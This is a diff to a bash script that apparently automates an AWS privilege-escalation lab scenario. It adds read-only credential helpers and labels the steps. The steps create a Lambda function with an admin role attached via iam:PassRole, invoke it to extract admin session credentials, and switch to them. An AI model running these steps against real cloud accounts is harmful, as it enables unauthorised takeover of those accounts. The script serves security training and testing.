@@ -65,6 +65,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -75,18 +84,29 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Configure AWS credentials with starting user and verify identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -101,15 +121,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -119,7 +141,7 @@ else
 fi
 echo ""
 
-# Step 5: Prepare Lambda function payload
+# [EXPLOIT] Step 5: Prepare Lambda function payload
 echo -e "${YELLOW}Step 5: Preparing Lambda function to extract admin credentials${NC}"
 echo "Creating Python function that will extract credentials from the admin role..."
 
@@ -151,8 +173,9 @@ cd - > /dev/null
 
 echo -e "${GREEN}✓ Lambda function payload prepared${NC}\n"
 
-# Step 6: Create Lambda function with admin role (PassRole escalation)
+# [EXPLOIT] Step 6: Create Lambda function with admin role (PassRole escalation)
 echo -e "${YELLOW}Step 6: Creating Lambda function with admin role${NC}"
+use_starting_creds
 echo "This is the privilege escalation vector - passing the admin role to Lambda..."
 ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
 echo "Admin Role ARN: $ADMIN_ROLE_ARN"
@@ -179,14 +202,15 @@ else
 fi
 echo ""
 
-# Step 7: Wait for Lambda function to be ready
+# [EXPLOIT] Step 7: Wait for Lambda function to be ready
 echo -e "${YELLOW}Step 7: Waiting for Lambda function to be ready${NC}"
 echo "Allowing time for Lambda function initialization..."
 sleep 15
 echo -e "${GREEN}✓ Lambda function ready${NC}\n"
 
-# Step 8: Invoke the Lambda function to extract credentials
+# [EXPLOIT] Step 8: Invoke the Lambda function to extract credentials
 echo -e "${YELLOW}Step 8: Invoking Lambda function to extract admin credentials${NC}"
+use_starting_creds
 echo "Invoking function: $LAMBDA_FUNCTION_NAME"
 
 show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $LAMBDA_FUNCTION_NAME --payload '{}' /tmp/response.json --output json"
@@ -209,7 +233,7 @@ else
     exit 1
 fi
 
-# Step 9: Extract and parse admin credentials from response
+# [EXPLOIT] Step 9: Extract and parse admin credentials from response
 echo -e "${YELLOW}Step 9: Extracting admin credentials from Lambda response${NC}"
 
 # Parse the nested JSON response
@@ -240,7 +264,7 @@ echo "Secret Access Key: ${ADMIN_SECRET_KEY:0:20}..."
 echo "Session Token: ${ADMIN_SESSION_TOKEN:0:20}..."
 echo -e "${GREEN}✓ Successfully extracted admin credentials${NC}\n"
 
-# Step 10: Switch to admin credentials
+# [EXPLOIT] Step 10: Switch to admin credentials (dynamic role session from Lambda)
 echo -e "${YELLOW}Step 10: Switching to admin credentials${NC}"
 export AWS_ACCESS_KEY_ID=$ADMIN_ACCESS_KEY
 export AWS_SECRET_ACCESS_KEY=$ADMIN_SECRET_KEY
@@ -253,7 +277,7 @@ ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $ADMIN_IDENTITY"
 echo -e "${GREEN}✓ Successfully switched to admin credentials${NC}\n"
 
-# Step 11: Verify admin access
+# [EXPLOIT] Step 11: Verify admin access (using dynamic admin role session creds)
 echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
